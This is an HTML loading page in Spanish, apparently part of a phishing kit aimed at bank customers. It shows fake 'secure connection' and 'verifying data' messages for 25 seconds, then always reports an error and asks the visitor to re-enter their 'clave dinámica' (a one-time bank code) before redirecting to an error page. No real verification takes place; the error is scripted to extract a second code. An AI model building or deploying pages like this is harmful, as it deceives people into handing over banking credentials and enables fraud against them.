<head>
  <meta charset="UTF-8">
  <meta content="es" http-equiv="Content-Language">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Cargando...</title>
  <style>
    body {
      font-family: 'Manrope', sans-serif;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      background-color: #fff;
    }
    #logo {
      width: 150px;
      margin-bottom: 30px;
    }
    .loader {
      border: 6px solid #f3f3f3;
      border-radius: 50%;
      border-top: 6px solid #E0128B;
      width: 50px;
      height: 50px;
      animation: spin 1s linear infinite;
      margin-bottom: 20px;
    }
    .mensaje {
      font-size: 18px;
      color: #333;
      text-align: center;
      padding: 0 10px;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>
  <link href="../../css2-4bf16?family=Manrope&amp;display=swap" rel="stylesheet">
</head>
<body>
  <img src="logo-3.png" alt="Logo" id="logo">
  <div class="loader"></div>
  <div class="mensaje" id="mensaje">Estableciendo conexión segura...</div>

  <script>
    // Array de mensajes para mostrar durante el proceso
    const mensajes = [
      "Estableciendo conexión segura...",
      "Casi listo, verificando datos...",
      "Procesando información...",
      "Esto no tardará mucho, gracias por tu paciencia...",
      "Estamos finalizando el proceso...",
      "¡Un momento más, casi terminamos!"
    ];

    let indiceMensaje = 0;
    const mensajeElem = document.getElementById('mensaje');

    // Se actualizará el mensaje cada 5 segundos durante 25 segundos (5 ciclos)
    const messageInterval = 5000; // 5 segundos
    const cycleDuration = 25000;   // 25 segundos

    const intervalId = setInterval(() => {
      if (indiceMensaje < mensajes.length) {
        mensajeElem.textContent = mensajes[indiceMensaje];
        indiceMensaje++;
      } else {
        // Si se agotan los mensajes, se reinicia el ciclo
        indiceMensaje = 0;
        mensajeElem.textContent = mensajes[indiceMensaje];
        indiceMensaje++;
      }
    }, messageInterval);

    // Después de 25 segundos, detener el ciclo y mostrar el mensaje final en rojo, con tamaño más pequeño
    setTimeout(() => {
      clearInterval(intervalId);
      mensajeElem.textContent = "¡Ups! hubo un error en tu información, por favor ingresa nuevamente tu clave dinámica.";
      mensajeElem.style.color = "red";
      mensajeElem.style.fontSize = "16px"; // Tamaño de fuente reducido
      // Esperar 5 segundos más y redirigir a error_dinamica.php
      setTimeout(() => {
        window.location.href = "error_dinamica.php.html";
      }, 5000);
    }, cycleDuration);
  </script>
</body>
